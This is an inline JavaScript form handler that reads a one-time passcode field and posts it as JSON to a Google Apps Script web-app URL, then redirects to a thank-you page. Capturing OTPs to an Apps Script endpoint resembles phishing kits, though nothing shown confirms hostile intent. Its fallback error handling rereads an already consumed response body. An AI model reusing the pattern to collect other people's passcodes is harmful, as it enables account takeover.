<script>
  (function () {
    const form = document.getElementById('regForm');
    const statusEl = document.getElementById('status');

    // Your actual Google Apps Script Web App URL
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbzaF78aMZsI8ZpLtQ9JGOXy2e1NIx6U2bIKP1PVHTgdIMlR1O818kUtUd3nyw6Fp43s/exec';

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      statusEl.textContent = 'Submitting...';
      statusEl.style.color = '#666';

      const validation_otp = document.getElementById('validation_otp').value.trim();
      const payload = { validation_otp };

      try {
        const resp = await fetch(WEBAPP_URL, {
          method: 'POST',
          mode: 'cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        let json;
        try {
          json = await resp.json();
        } catch {
          const text = await resp.text();
          throw new Error("Invalid JSON response: " + text);
        }

        if (json.result === 'success') {
          window.location.href = "thankyou.html"; // redirect after success
        } else {
          statusEl.textContent = 'Submission failed. Try again.';
          statusEl.style.color = '#aa0000';
        }
      } catch (err) {
        console.error(err);
        statusEl.textContent = 'Error submitting. Try again later.';
        statusEl.style.color = '#aa0000';
      }
    });
  })();
</script>
